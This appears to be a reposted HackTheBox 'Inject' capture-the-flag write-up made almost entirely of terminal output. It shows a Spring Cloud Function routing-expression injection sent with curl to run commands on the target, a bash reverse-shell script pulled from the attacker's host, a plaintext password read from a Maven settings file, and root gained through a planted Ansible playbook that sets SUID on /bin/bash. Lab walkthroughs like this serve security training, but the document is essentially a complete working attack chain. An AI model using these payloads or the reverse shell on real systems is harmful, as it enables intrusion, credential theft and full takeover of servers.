# HackTheBox Inject WriteUp

> 原文: https://www.ctfiot.com/124081.html
> ID: 124081


```
┌──(kali㉿kali)-[~/Desktop/Inject]
└─$ sudo nmap -Pn -n -v --reason -sS -p- --min-rate=1000 -A 10.10.11.204 -oN nmap.log

PORT STATE SERVICE REASON VERSION
22/tcp open ssh syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
| 3072 ca:f1:0c:51:5a:59:62:77:f0:a8:0c:5c:7c:8d:da:f8 (RSA)
| 256 d5:1c:81:c9:7b:07:6b:1c:c1:b4:29:25:4b:52:21:9f (ECDSA)
|_ 256 db:1d:8c:eb:94:72:b0:d3:ed:44:b9:6c:93:a7:f9:1d (ED25519)
8080/tcp open nagios-nsca syn-ack ttl 63 Nagios NSCA
| http-methods:
|_ Supported Methods: GET HEAD OPTIONS
|_http-title: Home
┌──(kali㉿kali)-[~/Desktop/Inject]
└─$ ssh phil@10.10.11.204

phil@10.10.11.204s password:
Permission denied, please try again.
┌──(kali㉿kali)-[~/Desktop/Inject]
└─$ curl -X POST http://10.10.11.204:
8080/functionRouter -H 'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("touch /tmp/pwned")' --data-raw 'data' -v
Note: Unnecessary use of -X or --request, POST is already inferred.
* Trying 10.10.11.204:
8080...
* Connected to 10.10.11.204 (10.10.11.204) port 8080 (#0)
> POST /functionRouter HTTP/1.1
> Host: 10.10.11.204:
8080
> User-Agent: curl/7.88.1
> Accept: */*
> spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("touch /tmp/pwned")
> Content-Length: 4
> Content-Type: application/x-www-form-urlencoded
>
< HTTP/1.1 500
< Content-Type: application/json
< Transfer-Encoding: chunked
< Date: Sun, 09 Jul 2023 15:51:54 GMT
< Connection: close
<
* Closing connection 0
{"timestamp":"2023-07-09T15:51:54.787+00:00","status":
500,"error":"Internal Server Error","message":"EL1001E: Type conversion problem, cannot convert from java.lang.ProcessImpl to java.lang.String","path":"/functionRouter"}
┌──(kali㉿kali)-[~/Desktop/Inject]
└─$ cat rce.sh
#!/bin/bash

bash -i >& /dev/tcp/10.10.14.5/5555 0>&1
┌──(kali㉿kali)-[~/Desktop/Inject]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
┌──(kali㉿kali)-[~/Desktop/Inject]
└─$ curl -X POST http://10.10.11.204:
8080/functionRouter -H 'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("curl 10.10.14.5/rce.sh -o /tmp/rce")' --data-raw 'data' -v
Note: Unnecessary use of -X or --request, POST is already inferred.
* Trying 10.10.11.204:
8080...
* Connected to 10.10.11.204 (10.10.11.204) port 8080 (#0)
> POST /functionRouter HTTP/1.1
> Host: 10.10.11.204:
8080
> User-Agent: curl/7.88.1
> Accept: */*
> spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("curl 10.10.14.5/rce.sh -o /tmp/rce")
> Content-Length: 4
> Content-Type: application/x-www-form-urlencoded
>
< HTTP/1.1 500
< Content-Type: application/json
< Transfer-Encoding: chunked
< Date: Sun, 09 Jul 2023 15:59:34 GMT
< Connection: close
<
* Closing connection 0
{"timestamp":"2023-07-09T15:59:34.632+00:00","status":
500,"error":"Internal Server Error","message":"EL1001E: Type conversion problem, cannot convert from java.lang.ProcessImpl to java.lang.String","path":"/functionRouter"}
┌──(kali㉿kali)-[~/Desktop/Inject]
└─$ nc -lvnp 5555
listening on [any] 5555 ...
┌──(kali㉿kali)-[~/Desktop/Inject]
└─$ curl -X POST http://10.10.11.204:
8080/functionRouter -H 'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("bash /tmp/rce")' --data-raw 'data' -v
Note: Unnecessary use of -X or --request, POST is already inferred.
* Trying 10.10.11.204:
8080...
* Connected to 10.10.11.204 (10.10.11.204) port 8080 (#0)
> POST /functionRouter HTTP/1.1
> Host: 10.10.11.204:
8080
> User-Agent: curl/7.88.1
> Accept: */*
> spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("bash /tmp/rce")
> Content-Length: 4
> Content-Type: application/x-www-form-urlencoded
>
< HTTP/1.1 500
< Content-Type: application/json
< Transfer-Encoding: chunked
< Date: Sun, 09 Jul 2023 16:04:52 GMT
< Connection: close
<
* Closing connection 0
{"timestamp":"2023-07-09T16:04:52.227+00:00","status":
500,"error":"Internal Server Error","message":"EL1001E: Type conversion problem, cannot convert from java.lang.ProcessImpl to java.lang.String","path":"/functionRouter"}
┌──(kali㉿kali)-[~/Desktop/Inject]
└─$ nc -lvnp 5555
listening on [any] 5555 ...
connect to [10.10.14.5] from (UNKNOWN) [10.10.11.204] 45774
bash: cannot set terminal process group (822): Inappropriate ioctl for device
bash: no job control in this shell
frank@inject:/$ whoami
frank
frank@inject:/home$ ls -l
total 8
drwxr-xr-x 5 frank frank 4096 Feb 1 18:38 frank
drwxr-xr-x 3 phil phil 4096 Feb 1 18:38 phil
frank@inject:~$ ls -la
ls -la
total 28
drwxr-xr-x 5 frank frank 4096 Feb 1 18:38 .
drwxr-xr-x 4 root root 4096 Feb 1 18:38 ..
lrwxrwxrwx 1 root root 9 Jan 24 13:57 .bash_history -> /dev/null
-rw-r--r-- 1 frank frank 3786 Apr 18 2022 .bashrc
drwx------ 2 frank frank 4096 Feb 1 18:38 .cache
drwxr-xr-x 3 frank frank 4096 Feb 1 18:38 .local
drwx------ 2 frank frank 4096 Feb 1 18:38 .m2
-rw-r--r-- 1 frank frank 807 Feb 25 2020 .profile
frank@inject:~/.m2$ cat settings.xml
<?xml version="1.0" encoding="UTF-8"?>
<settings xmlns="http://maven.apache.org/POM/4.0.0" xmlns:
xsi="http://www.w3.org/2001/XMLSchema-instance"
 xsi:
schemaLocation="http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd">
 <servers>
 <server>
 Inject
 phil
 DocPhillovestoInject123
 ${user.home}/.ssh/id_dsa
 <filePermissions>660</filePermissions>
 <directoryPermissions>660</directoryPermissions>
 <configuration></configuration>
 </server>
 </servers>
</settings>
frank@inject:~/.m2$ su phil
Password: DocPhillovestoInject123
phil@inject:/home/frank/.m2$ whoami
phil
phil@inject:~$ ls -l
ls -l
total 4
-rw-r----- 1 root phil 33 Jul 9 14:45 user.txt
phil@inject:~$ sudo -l
[sudo] password for phil: DocPhillovestoInject123

Sorry, user phil may not run sudo on localhost.
phil@inject:~$ ./pspy64

2023/03/16 16:28:01 CMD: UID=0 PID=3424 | /bin/sh -c /usr/local/bin/ansible-parallel /opt/automation/tasks/*.yml
2023/03/16 16:28:01 CMD: UID=0 PID=3430 | /usr/bin/python3 /usr/bin/ansible-playbook /opt/automation/tasks/playbook_1.yml
phil@inject:/opt/automation$ ls -l
total 4
drwxrwxr-x 2 root staff 4096 Jul 9 16:40 tasks
phil@inject:/opt/automation$ id
uid=1001(phil) gid=1001(phil) groups=1001(phil),50(staff)
┌──(kali㉿kali)-[~/Desktop/Inject]
└─$ cat exploit.yml
- hosts: localhost
 tasks:
 - name: rce
 shell: chmod u+s /bin/bash
┌──(kali㉿kali)-[~/Desktop/Inject]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
phil@inject:/opt/automation/tasks$ wget 10.10.14.5/exploit.yml
--2023-07-09 16:53:11-- http://10.10.14.5/exploit.yml
Connecting to 10.10.14.5:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 77 [application/octet-stream]
Saving to: ‘exploit.yml’

exploit.yml 100%[===================>] 77 --.-KB/s in 0s

2023-07-09 16:53:11 (4.28 MB/s) - ‘exploit.yml’ saved [77/77]
phil@inject:/opt/automation/tasks$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1183448 Apr 18 2022 /bin/bash
phil@inject:/opt/automation/tasks$ bash -p
bash-5.0
# whoami
root
bash-5.0
# ls -l /root
total 8
-rw-r--r-- 1 root root 150 Oct 20 2022 playbook_1.yml
-rw-r----- 1 root root 33 Jul 9 14:45 root.txt
```
